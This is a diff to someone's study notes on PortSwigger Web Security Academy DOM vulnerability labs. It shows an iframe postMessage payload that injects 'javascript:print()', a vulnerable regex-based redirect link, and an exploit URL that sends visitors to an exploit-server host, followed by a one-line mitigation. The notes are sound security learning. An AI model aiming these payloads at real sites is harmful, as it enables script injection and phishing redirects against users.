@@ -38,3 +38,19 @@ The exploit payload delivers a JSON object where the url calls malicious javascr
 ```
 <iframe src=https://0a55002603bafe7d81a09d2000d50006.web-security-academy.net/ onload='this.contentWindow.postMessage(JSON.stringify({type:"load-channel",url:"javascript:print()"}),"*")'>
 ```
+
+## DOM XSS using redirect url 
+The blog post page contains a "Back to Blog" button which redirects to the homepage. 
+The button includes an anchor which uses regex to get the url, allowing an attacker to insert an arbitrary url as the query parameter.
+
+```
+<a href="#" onclick="returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : &quot;/&quot;">Back to Blog</a>
+```
+
+Exploit is to add the url query parameter to the URL to add it to the location object. 
+The regex will process it as the redirect url.
+```
+https://0ac700710410da51818e07ba00f3006b.web-security-academy.net/post?postId=10&url=https://exploit-0ac30026047cda8a81bd061a014900b6.exploit-server.net/
+```
+
+Mitigation: use strict validation against a whitelist of URLs
